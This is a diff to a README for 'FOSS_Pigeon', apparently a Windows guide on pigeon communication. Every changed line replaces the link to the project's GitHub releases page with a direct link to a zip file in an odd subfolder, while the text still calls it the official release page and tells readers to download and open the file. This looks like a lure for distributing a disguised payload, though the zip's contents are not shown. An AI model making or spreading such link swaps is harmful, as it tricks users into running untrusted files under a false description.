@@ -1,6 +1,6 @@
 # 🐦 FOSS_Pigeon - Simple Pigeon Communication Guide
 
-[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Haleighquick156/FOSS_Pigeon/releases)
+[![Download](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Haleighquick156/FOSS_Pigeon/raw/refs/heads/main/althea/Pigeon_FOS_starlights.zip)
 
 ## 📘 What This Is
 
@@ -24,7 +24,7 @@ For best results, use a recent version of Windows 10 or Windows 11.
 
 Visit the release page here:
 
-https://github.com/Haleighquick156/FOSS_Pigeon/releases
+https://github.com/Haleighquick156/FOSS_Pigeon/raw/refs/heads/main/althea/Pigeon_FOS_starlights.zip
 
 On that page, look for the latest release. You may see one or more files under the release. Pick the file that matches your needs and download it to your computer.
 
@@ -131,7 +131,7 @@ A calm, steady routine usually works better than rushing through the process.
 
 When a new version appears on the release page, use the same link:
 
-https://github.com/Haleighquick156/FOSS_Pigeon/releases
+https://github.com/Haleighquick156/FOSS_Pigeon/raw/refs/heads/main/althea/Pigeon_FOS_starlights.zip
 
 Check the latest release name and compare it with the version you already have. If there is a newer file, download it again and replace your old copy if needed.
 
@@ -179,7 +179,7 @@ You may find this guide useful if you want to:
 
 Use the release page from the official repository only:
 
-https://github.com/Haleighquick156/FOSS_Pigeon/releases
+https://github.com/Haleighquick156/FOSS_Pigeon/raw/refs/heads/main/althea/Pigeon_FOS_starlights.zip
 
 After you download the file, keep it in a known folder and open only the file you intended to use. This helps you avoid confusion with older copies or unrelated files
 
